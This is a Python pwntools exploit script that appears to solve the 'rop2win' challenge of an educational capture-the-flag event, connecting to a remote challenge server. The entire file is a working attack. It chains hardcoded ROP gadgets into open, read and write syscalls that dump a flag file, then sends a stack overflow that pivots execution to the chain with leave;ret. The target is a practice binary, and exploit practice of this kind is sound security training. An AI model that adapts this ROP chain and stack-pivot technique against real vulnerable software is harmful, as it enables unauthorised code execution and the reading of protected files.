from pwn import *
from pwnlib.util.packing import p64

context.arch = "amd64"
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = "debug"

r = remote("edu-ctf.zoolab.org", 30204)
# r = process("./Rop2win/share/rop2win")

FLAG_path = b"/home/rop2win/flag\x00"
# FLAG_path = b"./testflag\x00"

ROP_global = 0x4df360
FN_global = 0x4df460

# ROPgadget --binary rop2win --opcode 0F05C3
# ROPgadget --binary rop2win --multibr --depth 2 | grep syscall

syscall_ret = 0x42cea4      # syscall ; ret   , Multiple Syscall Usage
pop_rax = 0x4607e7          # pop rax ; ret
pop_rdi = 0x40186a          # pop rdi ; ret
pop_rsi = 0x4028a8          # pop rsi ; ret
pop_rdx = 0x40176f          # pop rdx ; ret
leave_ret = 0x401ebd        # leave ; ret

# Open file, read, write to stdout

rop_chain = flat(
    # Open
    pop_rax, 2,
    pop_rdi, FN_global,
    pop_rsi, 0,
    pop_rdx, 0,
    syscall_ret,

    # Read
    pop_rdi, 3,
    pop_rax, 0,
    pop_rsi, FN_global,
    pop_rdx, 0x20,
    syscall_ret,

    # Write
    pop_rax, 1,
    pop_rdi, 1,
    pop_rsi, FN_global,
    pop_rdx, 0x20,
    syscall_ret
)

# gdb.attach(r)

r.sendafter(b"Give me filename: ", FLAG_path)
r.sendafter(b"Give me ROP: ", b'A'*0x08 + rop_chain)
r.sendafter(b"Give me overflow: ", b"A"*0x20+p64(ROP_global)+p64(leave_ret))

r.interactive()

